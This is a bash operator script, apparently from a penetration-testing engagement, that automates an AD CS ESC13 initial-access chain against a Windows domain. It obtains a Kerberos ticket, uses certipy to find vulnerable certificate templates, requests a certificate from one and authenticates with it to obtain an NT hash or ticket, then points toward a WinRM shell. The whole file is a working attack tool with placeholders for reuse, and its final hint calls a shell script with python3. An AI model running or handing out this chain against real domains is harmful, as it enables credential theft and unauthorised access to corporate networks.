#!/usr/bin/env bash
# initial_access.sh
#
# Operator script implementing the AD CS ESC13 initial access chain:
#   1. Request a TGT for the low-privileged user
#   2. Enumerate vulnerable certificate templates (certipy find)
#   3. Request a certificate from the temporary remote-management template
#   4. Authenticate with the certificate to obtain an NT hash / TGT
#
# Sanitised reusable version. Set the placeholders below.
# No real credentials or client identifiers are included.

set -euo pipefail

# ─────────────────────────────────────────────
# EDIT THESE PLACEHOLDERS FOR YOUR ENGAGEMENT
# ─────────────────────────────────────────────
DOMAIN="corp.local"
REALM="CORP.LOCAL"
DC="dc-a01.corp.local"
TARGET=""               # Primary DC IP
USER="lowpriv.user"     # Low-privileged domain user
PASSWD=""               # Low-privileged user password (or use -k + ccache)
CA="CORP-DC01-CA"       # Certificate Authority name
T_NAME="TemporaryWinRM" # Vulnerable template allowing ESC13
# ─────────────────────────────────────────────

if [ -z "$TARGET" ] || [ -z "$PASSWD" ]; then
  echo "Set TARGET and PASSWD in the script." >&2
  exit 1
fi

# 1. TGT
getTGT.py "$DOMAIN/$USER:$PASSWD" -dc-ip "$TARGET"
export KRB5CCNAME="${USER}.ccache"

# 2. Enumerate vulnerable templates
certipy find -k -dc-ip "$DC" -enabled -ns "$TARGET" -target "$DC" -vulnerable -stdout

# 3. Request certificate from the ESC13-prone template
certipy req -u "$USER" -p "$PASSWD" -dc-ip "$TARGET" -target "$DC" -ca "$CA" -template "$T_NAME" -k

# 4. Authenticate with the certificate
certipy auth -pfx "${USER}.pfx" -dc-ip "$TARGET"

echo "[+] Try a WinRM shell:"
echo "    python3 winrm_target.sh $DC -k"
